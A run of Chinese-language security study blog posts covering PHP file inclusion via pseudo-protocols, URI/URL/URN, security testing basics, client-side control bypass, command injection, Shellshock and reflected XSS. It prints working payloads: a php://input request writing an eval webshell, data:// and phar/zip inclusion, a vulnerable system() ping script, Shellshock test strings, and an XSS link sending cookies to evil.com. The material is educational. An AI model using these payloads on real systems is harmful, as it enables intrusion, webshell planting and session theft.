Accessing local filesystem http:// — Accessing HTTP(s) URLs ftp:// — Accessing FTP(s) URLs php:// — Accessing various I/O streams zlib:// — Compression Streams data:// — Data (RFC 2397) glob:// — Find pathnames matching pattern phar:// — PHP Archive ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — Audio streams expect:// — Process Interaction Streams php:// php:// 伪协议可以访问PHP自己的输入和输出流以及错误描述描述符，还有访问内存和磁盘备份的临时文件流以及过滤器来决定想要访问的读写文件资源 php://stdin, php://stdout 和 php://stderr\n使用php://stdin, php://stdout 和 php://stderr可以直接访问PHP进行所对应的输入或者输出流，访问的时候使用的是引用的文件描述符，而真正的STDIN是不会收到影响的 php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。 php://filter\nphp://filter 可以与 readfile(), file(), file_get_contents() 函数进行配合使用，用来读取本地磁盘文件，它可以在打开文件时对文件内容进行处理 条件：Read-only只读，需要开启 allow_url_fopen，不需要开启 allow_url_include； 可以使用参数来指定过滤的方式 名称 描述 resource=\u0026lt;要过滤的数据流\u0026gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=\u0026lt;读链的筛选列表\u0026gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符分隔。 write=\u0026lt;写链的筛选列表\u0026gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符分隔。 \u0026lt;；两个链的筛选列表\u0026gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 试一下试试 \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename); echo $filename; ?\u0026gt; 这里我们通过 php://filter 可以得到 lrfiSession.php 中以base64加密的内容，然后再解密得到其明文内容 http://localhost/lrfiTest.php?filename=php://filter/read=convert.base64-encode/resource=lrfiSession.php 可用的过滤器列表： https://www.php.net/manual/zh/filters.php php://input\nphp://input是一个“只读”的流，它允许我们直接读取POST上没有经过解析的原始数据 enctype=\u0026ldquo;multipart/form-data\u0026rdquo; 的时候 php://input 是无效的 需要同时开启 allow_url_fopen ，以及 allow_url_include \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename); ?\u0026gt; 我们可以利用 php://input 来执行POST中的php代码，从而写入一句话木马到服务器文件目录下 http://localhost/lrfiTest.php?filename=php://input \u0026lt;?PHP fputs(fopen(\u0026#39;lrfiInput.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php eval($_POST[a]) ?\u0026gt;\u0026#39;);?\u0026gt; php://output\n测试 file:// file:// 代表了本地文件的路径，它也是默认的分装类，如果文件路径没有指明使用哪一个分装类，那就默认是 file:// Usage /path/to/file.ext relative/path/to/file.ext fileInCwd.ext C:/path/to/winfile.ext C:\\path\\to\\winfile.ext \\\\smbserver\\share\\path\\to\\winfile.ext file:///path/to/file.ext data:// data:// 是一个数据流封装器 使用格式： data:[\u0026lt;mime type\u0026gt;][;charset=\u0026lt;charset\u0026gt;][;base64],\u0026lt;encoded data\u0026gt; 协议头：data://，使后面的内容被识别为一个data URI资源 MIME类型，我们在 File upload 中也曾经介绍过，例如text/plain, image/jpeg, image/gif, image/png, etc. 编码设置，默认编码为 charset=US=ASCII （自动编码为%xx） base64编码设定，可选项，base64编码中仅包含0-9,a-z,A-Z,+,/,=，其中=是用来编码补白的 DATA URI所承载的内容（也是我们插入要注入的恶意代码的地方），它可以是纯文本编写的内容，也可以是经过base64编码的内容。 使用条件： allow_url_fopen: on allow_url_include: on/off php版本≥php5.2 需要注意的是，当allow_url_include为on时，任意文件包含就会成为任意命令执行 利用： plaintext: ?filename=data://text/plain,\u0026lt;?php phpinfo()?\u0026gt; or encoded by base64: ?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= http://localhost/lrfiTest.php?filename=data://text/plain,\u0026lt;?php phpinfo()?\u0026gt; phar:// phar只能用在本地文件上，因此我们所举的例子都是在文件上传成功的基础上进行的 使用格式 ?filename=phar://[压缩包名称][/内部文件名称] ?filename=phar://xxx.png/shell.php 压缩文件可以改为任意后缀 假设我们通过文件上传漏洞上传了一个叫做 shell.png 的压缩包（一定要用zip压缩，rar不行），然后shell.png解压缩之后是phpinfo.php这个文件 那么我们就可以再利用 phar 来进行解压缩并执行 http://localhost/lrfiTest.php?filename=phar://shell.png/phpinfo.php http://localhost/lrfiTest.php?filename=phar://[绝对路径]shell.png/phpinfo.php zip:// 用法与phar有所不同 ?filename=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] ?filename=zip://xxx.png#shell.php。 条件： PHP \u0026gt; =5.3.0，注意在windows下测试要 5.3.0\u0026lt;PHP\u0026lt;5.4 才可以 同时，#在url中要编码为%23，否则浏览器默认不会传输特殊字符。 http://localhost/lrfiTest.php?filename=zip://[absolute_path]shell.png%23phpinfo.php Reference Web安全实战系列：文件包含漏洞 PHP伪协议总结 文件包含漏洞与php伪协议 支持的协议和封装协议 利用 phar 拓展 php 反序列化漏洞攻击面 ","date":"2022-05-21T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/lrfi_basic/","title":"Local/Remote File Inclusion 文件包含漏洞"},{"content":"URI \u0026amp; URL \u0026amp; URN 的关系 很长一段时间以来，我都搞不清楚URI，URL的关系，最近养成了写博客的习惯，那么我们就来一起搞搞明白。 如果有和我一样搞不清楚的师傅，我只能说这不怪我们，首先这两个玩意儿长的很像，很容易就搞混，因此在本文中将全部采用大写的形式加以区分。 其次就是我到目前为止的一个观点，由于中文过于博大精深，导致很多翻译过来的内容变得非常绕口难懂，同时掺杂着一些不恰当的比喻，导致了这些概念之间的关系变得非常模糊。 URI URI, Uniform Resource Identifier, 统一资源标志符 “统一”，表示使用一种统一的规范来表示 “资源标识符”，表示URI是用来指代一种资源，网页，图片，视频，etc.. 下面是URI的统一格式规范，依次由五个部分组成 URI = scheme \u0026#34;:\u0026#34; [\u0026#34;//\u0026#34; authority] path [\u0026#34;?\u0026#34; query] [\u0026#34;#\u0026#34; fragment] 其中Authority可以划成三个子模块 authority = [userinfo \u0026#34;@\u0026#34;] host [\u0026#34;:\u0026#34; port] 具体的各个组成模块大家可以去Wikipedia一个个检查过来 我们用一个例子结束这个章节： https://john.doe@www.example.com:123/forum/questions/?tag=networking\u0026order=newest#top 相信这个也是大多数人常见的一个UR*的例子，那么大家也会好奇那么URL应该长什么样的？我们接着来看 URL URL, Uniform Resource Locator, 统一资源定位符 和之前一样，我们从其名字出发来解释URL的作用 “统一”，同样，表示使用一种统一的规范来表示 “资源定位符”，表示URL需要帮助找到一个资源所在的位置，使用用户能够获取到这个资源 那它究竟应该长什么样呢？ 和我们以前提到的格式一模一样，这就是一个URL：https://john.doe@www.example.com:123/forum/questions/?tag=networking\u0026order=newest#top 先别急着糊涂，我们先仔细看这张图，我们可以发现，有很多可选项，作为一个URL虽然也使用同样的语法规范，但是和它的名字一样，它需要一切能够指示一个资源位置的可选项 反过来说，URI，只需要能够代表这个资源的名称就可以了，不需要完成指示的工作，因此可以选择很少的选项，那么一旦完成了指示资源位置的任务，一个URI也可以被叫做URL 也就是说： URI包含URL， URI是URL的父类 一个能指示资源位置的URI也被叫做URL 一个URL一定是一个URI 一个URI不一定是一个URL，它还可以是URN 我们最后用一个Java Web中的例子来结束URI与URL的区分 我们重写Servlet的doGet方法来帮助服务器处理来自客户端的HTTP请求，并通过HttpServletRequest对象来获取GET请求的具体信息 接着通过getRequestURI() \u0026amp; getRequestURL()来分别获取请求的URI以及URL的信息 public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { System.out.println(\u0026#34;URI of the requested resource: \u0026#34; + request.getRequestURI()); System.out.println(\u0026#34;URL of the request resource: \u0026#34; + request.getRequestURL()); } 结果如下，我们可以看到，URI可以非常简短，工程名+资源的路径即可，而URL就需要完整的ip:port的信息来帮助唯一定位一个资源 URI of the requested resource: /JSPLearn/hello URL of the request resource: http://localhost:8089/JSPLearn/hello URN URN, Uniform Resource Name, 统一资源名称，是一种特殊的URI，特点是其scheme使用 urn: “统一”，表示使用一种统一的规范来表示 “资源名称”，表达了URN会表示一个资源的名称，并称这个标识会同时在空间以及时间上保持其唯一性，及全球唯一，并且在未来也会保持唯一 其与URI和URL的区别就在于其在时空上的唯一性，以及其并不能用来定位一个资源 Appendix URI scheme URI scheme也就是所有URI的第一部分，很多中文的翻译将其称作“协议”，但我总觉得有点怪怪的，因为如果是协议的话我们一般会用protocol，但是看到ftp，http又觉得无法反驳，直到我们看到了一个StackExchange上的回答： “It simply tells you how to interpret the part of the URL after the colon. \u0026hellip; This isn\u0026rsquo;t identical to a protocol, because there is no transport layer or encoding” URI scheme仅仅是告诉浏览器应该如何去解析后面的内容，例如 file: 就表示后面的是我们需要访问的本地资源的目录， http: 就表示需要用后面的路径来发起HTTP连接。 Reference What is the difference between a URI, a URL and a URN? Uniform Resource Identifier URL Uniform Resource Name What is a URI Scheme? ","date":"2022-05-21T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/uri_url_urn/","title":"URI \u0026 URL \u0026 URN 的关系"},{"content":"SCT Topic 1 Introduction to Security Testing What is Security Testing? 什么是安全测试 安全测试是一个很广泛的概念，我们可以列举几个典型的活动： Security Audit 安全审计 Vulnerability Assessment 漏洞评估 Penetration Testing 渗透测试 Red Teaming 红队测试 Ethical hacking 有道德的黑客攻击 在这周的topic中我们会具体展开介绍每一个活动所对应的细节 在此之前，我们可以先对安全测试下一个定义： Security Testing is the process to reveal flaws in a system in terms of Confidentiality, Integrity, Availability (CIA). 安全测试就是一个揭露系统在保密性，完整性和可用性（CIA）方面的缺陷的过程 CIA也是所有安全话题中最重要的三要素： Confidentiality 保密性: 限制没有授权的用户访问资源 Integrity 完整性：限制没有授权的用户修改资源 Availability 可用性: 保证资源随时可用 然后我们再总结黑客的攻击归为三种： Exploit the configuration done by the system administrator 修改管理员级别的系统配置 Exploit how the users use the system/service 利用用户对系统进行操作 Exploit software/hardware vulnerabilities 利用软硬件的漏洞 Penetration Testing 渗透测试 Penetration Testing (PT) 渗透测试通过多种漏洞测试工具来模拟真实的攻击手段来尝试渗透计算机系统的活动。 Penetration Testing Execution Standard (PTES) 列举了渗透测试的步骤，但这些步骤也并不固定 Pre-engagement Interactions 预交互 Intelligence Gathering 情报收集 Threat Modeling 威胁建模 Vulnerability Analysis 漏洞分析 Exploitation 漏洞利用 Post Exploitation 后漏洞利用 Reporting 报告 具体每一个环节大家可以根据上面的链接查看文档，这里需要需要强调的就是最后的报告环节，这也是很能反应专业性的地方，能清楚描述整一个渗透测试，对于后续客户的理解，采取措施是非常重要的（就是为了这份报告，才进行的这个渗透测试）。 Security Audit 安全审计，主要是为了检查企业的安全是否满足标准（ISO 27000) 以及资格证书而进行的，我们在安全管理课程中已经看过了，对于中小企业的安全资格证书检查是非常重要，减少一些基础的漏洞可以帮助企业避免很多的问题，个人认为安全审计随着国内的安全意识的提高以及规范化的提高也会逐渐普及以及形成产业进一步增加安全就业。 Vulnerability Analysis (VA) 漏洞分析 Vulnerability Analysis (VA) 漏洞分析是单纯地利用工具进行扫描系统和软件中的漏洞的活动，在进行扫描的时候，必须要同时使用开源和商业的工具，因为我们无法保证黑客不使用这些商业工具。 同时与渗透测试不同的是，漏洞分析只是单纯的扫描工具使用，而不涉及任何的交互 Red Teaming (RT) 红队测试 红队测试也是安全测试员进行模拟攻击来测试目标系统的安全性 这里有两个计量的单位： Time To Detect (TTD) 检测响应时间： 指的是目标系统通过杀毒软件或者IDS扫描到本次入侵或者病毒所需要的时间，具体的表现为安全分析师第一次记录成报告的时间 Time To Mitigate (TTM) 解决响应时间： 指的是目标企业的安全工程师多久能组织本次攻击 也反应了其他的一些内容： 安全团队与IT部门的配合是否高效 员工是否陷入了恐慌（安全培训） 但是要注意将渗透测试与红队测试区分开 Red Team 红队 攻击者（模拟） 模仿攻击的一整套流程 不告知蓝队何时用何种方法进行进攻 Blue Team 蓝队 企业中的防御者 不会被告知有红队的存在（但是在渗透测试中，双方会进行合作） Pennetration Tests Red Teaming Security Assessment Methodical Flexible Scope 严格的目标 没有具体的规则 1-2周的流程 2-6个月的参与 告知对方企业的蓝队 不通知对方的蓝队 识别漏洞 测试蓝队在程序，安全政策，防御工具以及技能 用来测试TTD与TTM的水平 必须在合法的范围下进行 ","date":"2022-05-20T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sct_topic_1_introduction_to_security_testing/","title":"SCT Topic 1 Introduction to Security Testing"},{"content":"SCT Topic 4: Web Attacks - Bypassing client-side authentication and others Bypassing client-Side Controls 客户端检查绕过 绕过客户端的检查主要是针对两个方面， 页面HTML代码 HTTP请求 客户端的检查一般来说都能被轻松的绕过，主要的防御手段还是服务器端需要进行严格的输入净化，但是设置合理的客户端检查可以帮助正常的用户减少麻烦 我们直接来看具体的种类和例子吧 URL parameters URL参数 URL后面接的GET参数可以被轻易修改 http://example.com/shop/?prod=3\u0026amp;price=32\u0026amp;currency=USD Hidden form fields 隐藏的表格内容 有些网页会有隐藏的表单内容用于后续的提交，这些表格可以轻易被浏览器的开发工具所修改，因此服务器端也得对这部分的数据做严格的审核 \u0026lt;p\u0026gt;Please enter the required quantity:\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;Shop.aspx?prod=1\u0026#34;\u0026gt; Product: xPhone Ultimate \u0026lt;br/\u0026gt; Price: 449 \u0026lt;br/\u0026gt; (Maximum quantity is 50)\u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;price\u0026#34; value=\u0026#34;449\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Buy\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; Length limits 长度限制 长度的限制也可以轻易被修改 \u0026lt;p\u0026gt;Please enter the required quantity:\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;Shop.aspx?prod=1\u0026#34;\u0026gt; Product: iPhone Ultimate \u0026lt;br/\u0026gt; Price: 449 \u0026lt;br/\u0026gt; Quantity: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;quantity\u0026#34; maxlength=\u0026#34;1\u0026#34;\u0026gt; (Maximum quantity is 50) \u0026lt;br/\u0026gt; \u0026lt;input type=”hidden” name=”price” value=”449”\u0026gt; \u0026lt;input type=”submit” value=”Buy”\u0026gt; \u0026lt;/form\u0026gt; Disabled elements 不可修改的元素 开发者工具修改 \u0026lt;p\u0026gt;Please enter the required quantity:\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;Shop.aspx?prod=1\u0026#34;\u0026gt; Product: iPhone Ultimate \u0026lt;br/\u0026gt; Price: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;price\u0026#34; disabled=\u0026#34;true\u0026#34; value=\u0026#34;449\u0026#34;\u0026gt; Quantity: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;quantity\u0026#34;\u0026gt;(Maximum quantity is 50) \u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Buy\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; Script-based validation 前端的JS脚本检查，可以通过debugger，Burp抓住请求后直接修改，chrome可以直接修改 \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;Shop.aspx?prod=2\u0026#34; onsubmit=\u0026#34;return validateForm(this)\u0026#34;\u0026gt; Product: Samsung Multiverse \u0026lt;br/\u0026gt; Price: 399 \u0026lt;br/\u0026gt; Quantity: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;quantity\u0026#34; (Maximum quantity is 50) \u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Buy\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; function validateForm(theForm) { var isInteger = /^\\d+$/; var valid = isInteger.test(quantity) \u0026amp;\u0026amp; quantity \u0026gt; 0 \u0026amp;\u0026amp; quantity \u0026lt;= 50; if (!valid) alert(\u0026#39;Please enter a valid quantity\u0026#39;); return valid; } \u0026lt;/script\u0026gt; Referer header Burp拦截请求后可以直接修改 GET /auth/472/CreateUser.ashx HTTP/1.1 Host: mdsec.net Referer: https://mdsec.net/auth/472/Admin.ashx HTTP cookies Burp拦截请求后可以直接修改 POST /shop/92/Shop.aspx?prod=3 HTTP/1.1 Host: mdsec.net Cookie: DiscountAgreed=25 Content-Length: 10 quantity=1 Local/Remote File Inclusion (LFI/RFI) 文件包含 详见：https://ginkgo.org.cn/posts/lrfi_basic/ Command Injection 命令行注入 命令行注入漏洞主要由黑客利用PHP中来执行系统命令的函数来执行自己的恶意代码(e.g., system(), exec(), popen()). 参数通常由POST or GET参数传入 例如我们有一个ping.php需要传入一个GET参数来测试一个host的ping连接，但是如果我们用 ‘;’ 拼接这个ping指令，就可以执行额外的操作 \u0026lt;?php $host = $_GET[\u0026#39;host\u0026#39;]; system(\u0026#39;ping -c 4 \u0026#39;.$host); ?\u0026gt; Shellshock 接下来我们来介绍一个很典型的命令行注入的漏洞，叫做Shellshock， Knowledge Prerequisites 我们平时经常使用终端来进行一些文件操作，以及安装命令行工具来增强其功能。 那么相信大家也将会经常被配置环境参数搞的头疼不已，而在shellshock中我们正是利用环境变量来注入命令行。 首先大家一般在Linux上使用的终端都是bash，shellshock也发生在老版本的bash上面 接下来，我们将通过比较Bash在一般模式下的变量定义的表现，以及对比开启一个新的bash子进程之后，这些变量会有什么表现来进一步了解这些令人头疼的变量 普通shell变量和bash子进程中的变量 [04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ gu=\u0026#34;hacker\u0026#34; [04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ echo $gu hacker [04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ bash #进入子进程 [04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$ echo $gu #无事发生 [04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$ 结论：bash子进程没有继承普通shell的变量 $gu 普通环境变量与bash子进程中的环境变量 [04/12/2018 09:31] seed@ubuntu:~/Seed/shellshock$ echo $gu hacker [04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ export gu [04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ bash [04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ echo $gu #继承了环境变量 hacker [04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ 结论：bash子进程继承了普通shell中定义的环境变量 $gu 普通函数变量和bash子进程中的函数变量 [04/12/2018 09:37] seed@ubuntu:~/Seed/shellshock$ gu() { echo \u0026#34;gu is a hacker\u0026#34;;} [04/12/2018 09:37] seed@ubuntu:~/Seed/shellshock$ gu gu is a hacker [04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ bash [04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ gu # gu未被定义 gu: command not found [04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ 结论：bash子进程没有继承函数变量 gu 函数环境变量和bash子进程中的函数环境变量 [04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ gu gu is a hacker [04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ export -f gu [04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ bash [04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ gu # inherit the environment variables gu gu is a hacker [04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ env | grep gu gu=hacker gu=() { echo \u0026#34;gu is a hacker\u0026#34; [04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ 结论：bash子进程继承了函数环境变量 gu shellshock发生的原因 接下来我们来尝试一点不一样的 普通函数变量再尝试 [04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ ailx10=\u0026#39;() { echo \u0026#34;ailx10 is a hacker\u0026#34;;}\u0026#39; # 普通函数变量 [04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -nf gu # 删除环境函数变量gu [04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -n gu # 删除环境变量gu [04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export -f ailx10 # 保存环境函数变量，失败 bash: export: ailx10: not a function [04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export ailx10 # 保存环境变量，成功 [04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ bash # 进入Bash子进程 [04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ ailx10 #ailx10 函数被继承 ailx10 is a hacker [04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ env | grep ailx10 # Pattern \u0026#34;(){ :; }\u0026#34; 被当作环境变量保存了（因此能够被进程） ailx10=() { echo \u0026#34;ailx10 is a hacker\u0026#34; [04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ env | grep ailx10 ailx10=() { echo \u0026#34;ailx10 is a hacker\u0026#34;;} [04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ 结论：因为我们再定义函数 ailx10 的时候，用了 (){ :; } ，所以无法被识别为环境函数变量，被当作是环境变量保存了 () { :; }再尝试 [04/12/2018 09:57] seed@ubuntu:~/Seed/shellshock$ ailx10=\u0026#39;() { :; };/bin/ls\u0026#39; [04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ export ailx10 # 当作环境变量保存 [04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ bash # /bin/ls 作为环境变量却被执行了 curl-7.20.0 myls myls.c myprog.cgi.1 readme.txt curl-7.20.0.tar.gz myls-notroot myprog.cgi myprog.cgi.2 [04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ 至此，我们可以总结 Shellshock 漏洞产生的原因 定义环境函数变量的时候，Bash错误的识别了 () { :; } 这种格式，被当作的是环境变量保存了 调用新的bash子进程 环境变量被继承，并执行，导致恶意代码被执行 验证Shellshock的方法\nenv x=\u0026#39;() { :;}; echo vulnerable\u0026#39; bash -c \u0026#34;echo this is a test\u0026#34; 第一部分会被Bash解析为一个环境变量进行保存 第二部分为需要执行的恶意指令 第三部分为调用一个bash子进程，同时会继承环境变量并执行恶意指令， -c 用来在新的bash下执行代码以表明新bash子进程启动成功 [04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ env x=\u0026#39;() { :;}; echo vulnerable\u0026#39; bash -c \u0026#34;echo this is a test\u0026#34; vulnerable this is a test [04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ [04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ [04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ env x=\u0026#39;() { :;}; echo vulnerable\u0026#39; bash -c : vulnerable [04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ 需要注意的是 ':' 什么也不做是一个空命令，相当于 :: $ if true; then echo yes; fi yes $ if :; then echo yes; fi yes $ shellshock 的危害 可以被用来反弹shell？ Web应用中的条件竞争漏洞 条件竞争主要就是在于多线程的访问并修改服务端的资源，因为没有控制好多个线程之间的执行次序，没有很好的上锁，导致他们访问的数据不同步，从而导致最后的数据出现错误。 这个我们在做CTF的时候应该也有遇到过，比如通过条件竞争绕过的文件上传漏洞 Appendix env https://linux.die.net/man/1/env Name env - run a program in a modified environment Synopsis env [OPTION]\u0026hellip; [-] [NAME=VALUE]\u0026hellip; [COMMAND [ARG]\u0026hellip;] Description Set each NAME to VALUE in the environment and run COMMAND. -i, \u0026ndash;ignore-environment start with an empty environment -0, \u0026ndash;null end each output line with 0 byte rather than newline -u, \u0026ndash;unset=NAME remove variable from the environment \u0026ndash;help display this help and exit \u0026ndash;version output version information and exit A mere - implies -i. If no COMMAND, print the resulting environment. export NAME export - Set export attribute for shell variables. SYNOPSIS export [-fn] [name[=value] \u0026hellip;] or export -p DESCRIPTION Set export attribute for shell variables. Marks each NAME for automatic export to the environment of subsequently executed commands. If VALUE is supplied, assign VALUE before exporting. Options: -f\trefer to shell functions -n\tremove the export property from each NAME -p\tdisplay a list of all exported variables and functions An argument of `\u0026ndash;\u0026rsquo; disables further option processing. Exit Status: Returns success unless an invalid option is given or NAME is invalid. SEE ALSO bash(1) IMPLEMENTATION GNU bash, version 5.0.17(1)-release (x86_64-redhat-linux-gnu) Copyright (C) 2019 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later http://gnu.org/licenses/gpl.html Reference OWASP:Shellshock 什么是ShellShock攻击？ ","date":"2022-05-20T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sct_topic_4_web_attacks_bypassing_client-side_authentication_and_others/","title":"SCT Topic 4: Web Attacks - Bypassing client-side authentication and others"},{"content":"Client-side Attacks 针对客户端的Web攻击 Prerequisite 要了解针对Web客户端的攻击，我们必须要先了解Session与Cookie的机制 HTTP协议在最初设计的时候是一个无状态（stateless）的协议，用户在浏览网页的时候发出请求，客户端只是返回页面的内容，不会保留任何关于本次请求的信息，即对用户一无所知。 可是随着Web应用的发展，一些服务要求保存用户的状态，例如网购等就需要用户进行登录后访问自己的专属内容，那么实现状态（state）保存的方式就是 Session 会话，会话的双方就是服务器端以及浏览器的用户端。每次用户发起请求，向服务端请求关于其专属账号的内容的时候，都需要附带上自己专属的信息，比如 credential个人标识符, 添加在购物车的内容。 保存这些内容的方式有： 保存在本地html中的隐藏内容 (过时) \u0026lt;INPUT TYPE=\u0026#34;hidden\u0026#34; NAME=\u0026#34;sessionid\u0026#34; VALUE=\u0026#34;7456\u0026#34;\u0026gt; Cookie (后面展开) 而向服务器端传递这些信息的手法 URL http://www.example.com/page.php?sessionid=7456 HTTP header (e.g., cookie) GET /page.php HTTP/1.1 Host: www.example.com ... Cookie: sessionid=7456 ... 慢慢的Cooike开始被广泛的使用，但是cookie有大小的限制（maximum size: 4096bytes）,无法存储太多的内容，那么我们为什么不在服务端来存储这些信息呢，这样也更安全，信息也可以更方便的被利用。 那么又多了一个问题，就是服务端存储了这些内容，那么客户端告诉服务端自己需要的是哪一个session的内容呢？这些就需要服务端在开启一个session（例如用户登录的时候）的时候，返回给客户端一个 sessionId ，之后每次客户端发出HTTP请求的时候，都带上这个 sessionId ，服务端就知道了是谁要访问什么信息了，然后当用户登出的时候，就自动删除session的内容节省内存（历史信息存储到数据库中）。 通过以上我们可以稍微总结一下Session与Cookie的特点： Session是存储在服务端的，由sessionId来唯一标识 Cookie是由服务端产生后保存在客户端的简短信息，用在HTTP请求中向服务端展示所拥有的信息 Cookie 接下来，我们再来展开讲讲Cookie的内容 我们再来回顾一下，Cookie与Session最大的区别就是，Cookie是由 服务器端创造 的，存储在 客户端 的信息。是服务器要求客户端浏览器保存键值对的一种技术。客户端有了Cookie之后，每次请求都发送给服务器，同时每个cookie的大小不能超过4KB 如果我们用BurpSuite抓HTTP请求，我们就会发现很多请求都会带上Cookie的内容，这就是客户端通过向服务端展示自己所拥有的（来自服务端分配的）特定cookie，来减少认证的复杂度 Cookie通过HTTP header向服务端进行传递，默认情况下是一对键值对，但也可以设置一些额外的信息来增加使用的灵活性 我们可以利用浏览器来观察这些存储到浏览器本地的cookie 服务端则通过HTTP的回复来设置cookie的内容以及其他参数 Client-side Attacks Goals 针对客户端的攻击的目标 盗取Cookie 篡改登录表格 执行额外的HTTP请求 以及任何用HTML以及Javascript做的任何事情！ XSS Cross-Site Scripting 跨站脚本攻击(简写为XSS主要是为了与CSS区分开) 的主要目标就是为了能够在目标页面上执行非法的脚本（JS）代码，“跨站”二字就体现在执行了本不应该出现在这个网站上的脚本代码。 一般来说，造成的原因还是缺乏对于用户输入的检查，进而导致非法的HTML/JS代码注入到页面上，被浏览器解析之后，攻击者就是可以执行任意代码 其具体表现往往就是通过精心设计的一个URL，通过社会工程学的方法诱导用户进行点击，URL中包含了将会植入到页面当中，被浏览器所解析执行的恶意代码。 接着我们来看一看常见的三种XSS攻击 Reflected XSS 反射型XSS \u0026ldquo;反射\u0026quot;意味着一个用户将不合法的输入先传给服务器，然后服务器再将不合法的javascript代码嵌入HTML中通过HTTP回复再反射给用户，进而浏览器解析执行这些恶意代码，从而造成危害，一般来说，黑客会通过社会工程学的手段来诱导用户点击一个包含恶意代码的链接。 反射型XSS也被称为非持久化XSS，因为其要求用户点击恶意链接才能执行一次 接下来我们来通过一个例子来说明反射型XSS是如何工作并造成损害的： 服务器上有一个页面的叫做 xss_test.php ，其中有一段代码要求用户输入用户名，输入的用户名会返回到页面上 Welcome \u0026lt;?php echo $_GET[\u0026#39;inject\u0026#39;]; ?\u0026gt; 用户点击了一条恶意修改的网页链接 http://www.example.com/xss_test.php?inject=\u0026lt;script\u0026gt;document.location= \u0026#39;http://evil.com/log.php?\u0026#39;+document.cookie\u0026lt;/script\u0026gt; 我们可以看到这里inject参数被设置为了 script tag的代码来访问攻击者的域名并提供当前网页所拥有的cookie的值 在用户点击之后，浏览器就会生成HTTP请求向服务器寻求资源，其中就包含了攻击者所包含的恶意代码 GET /xss_test.php?inject=%3Cscript%3Edocument.location%3D%27ht tp%3A%2F%2Fevil%2Flog.php%3F%27%2Bdocument.cookie%3C%2Fscript%3E Host: www.example.com ... 服务端的脚本通过将原本应该为用户名的内容拼接成html返回给用户，然后由浏览器自动解析执行，导致恶意代码被执行，用户的cookie被返回给了攻击者的网站，造成了泄露 